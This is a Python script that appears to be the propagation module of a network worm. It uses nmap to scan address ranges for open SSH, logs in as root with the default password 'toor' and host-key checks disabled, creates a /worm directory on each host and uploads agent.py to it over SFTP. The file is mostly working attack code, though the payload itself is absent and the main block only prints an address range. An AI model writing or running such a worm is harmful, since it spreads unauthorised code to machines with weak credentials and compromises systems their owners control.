import os
from http.client import HTTPConnection

import nmap
import ipaddress

import paramiko


def scan(addr_range):
    """scans network for open ports in range"""
    nm = nmap.PortScanner()
    nm.scan(hosts=addr_range, ports='22')
    nm.command_line()
    print(nm.scanstats())
    for host in nm.all_hosts():
        status = nm[host]
        yield status['addresses']['ipv4'], status['tcp'][22]['state']
        print(status)


def generate_range(addr: str, mask: int, n: int):
    """generates range of addresses based on given address and mask"""
    addr = addr.split('.')
    addr = [int(x) for x in addr]
    # mask = 2 ** (32 - mask) - 1
    addr[3] = addr[3] + n
    last = '.'.join([str(x) for x in addr])
    addr[3] = f'{addr[3] - n}-{addr[3]}'
    return '.'.join([str(x) for x in addr]), last


def generate_ips(start_ip, netmask, n):
    """
    Generate n IP addresses based on a starting address and a network mask.

    :param start_ip: str, starting IP address in dotted decimal notation (e.g. "192.168.1.1")
    :param netmask: str, network mask in dotted decimal notation (e.g. "255.255.255.0")
    :param n: int, number of IP addresses to generate
    :return: list of str, n IP addresses in dotted decimal notation
    """
    # TODO fix me to be more robust
    ip_addr = ipaddress.ip_address(start_ip)

    # Generate n IP addresses in the network
    ips = []
    while True:
        ips.append(str(ip_addr))
        if len(ips) == n:
            break
        ip_addr += 1

    return ips


def fetch_info(addr: str = '10.0.0.100'):
    try:
        conn = HTTPConnection(addr, 80, timeout=2)
        conn.request("GET", "/")
        resp = conn.getresponse()
        print(resp.status)
        print(resp.read())
    except TimeoutError:
        print('timed-out')
    finally:
        print('preceding')
    ...


def connect_remote(addr: str):
    cmd_to_execute = 'mkdir -p /worm'

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(addr, username='root', password='toor')
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmd_to_execute)
    ssh_stdout.channel.set_combine_stderr(True)

    output = ssh_stdout.readlines()
    print(f'=== res={output} ===')

    send_load(ssh)

    ssh.close()


def send_load(ssh: paramiko.SSHClient):
    # TODO send all files in dir
    path = os.path.dirname(os.path.realpath(__file__))
    sftp = ssh.open_sftp()
    print(f'=== sending to {path} ===')
    sftp.put(f'{path}/agent.py', '/worm/agent.py')
    print('=== load sent ===')
    sftp.close()


if __name__ == '__main__':
    print(generate_range('10.0.0.10', 24, 2))
